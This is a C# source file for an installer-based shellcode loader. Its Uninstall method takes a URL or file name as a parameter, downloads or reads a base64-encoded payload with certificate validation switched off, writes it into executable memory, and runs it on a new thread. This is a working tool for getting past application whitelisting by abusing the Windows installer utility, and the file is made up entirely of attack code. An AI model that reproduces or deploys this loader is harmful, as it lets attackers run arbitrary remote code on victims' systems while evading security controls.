using System;
using System.Net;
using System.Collections;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace installme
{
    [System.ComponentModel.RunInstaller(true)]
    public class MyInstaller : System.Configuration.Install.Installer
    {
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );


        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );

        public override void Uninstall(IDictionary savedState)
        {
            string filename = this.Context.Parameters["f"].Trim();
            Boolean debug = false;
            if (this.Context.IsParameterTrue("debug") == true)
                debug = true;

            Regex rexp = new Regex(
                             @"^(?<url>https?://(?:[a-z0-9-]+\.)+[a-z0-9]+(?::\d{1,5})?/.+)",
                             RegexOptions.IgnoreCase
                         );
            MatchCollection m = rexp.Matches(filename);
            string b64_payload = "";
            if (m.Count > 0)
            {
                GroupCollection group = m[0].Groups;
                WebClient wc = new WebClient();
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                b64_payload = wc.DownloadString(group["url"].Value);
            }
            else
            {
                if (debug) Console.WriteLine("[*] Reading payload from file");
                b64_payload = System.IO.File.ReadAllText(filename);
            }
            byte[] payload = Convert.FromBase64String(b64_payload);
            if (debug) Console.WriteLine("[*] Payload length = {0}", payload.Length);

            if (debug) Console.WriteLine("[*] Allocating memory");
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)payload.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (debug) Console.WriteLine("[*] Copying payload into memory");
            Marshal.Copy(payload, 0, (IntPtr)(funcAddr), payload.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;

            // execute native code
            if (debug) Console.WriteLine("[*] Creating Thread");
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
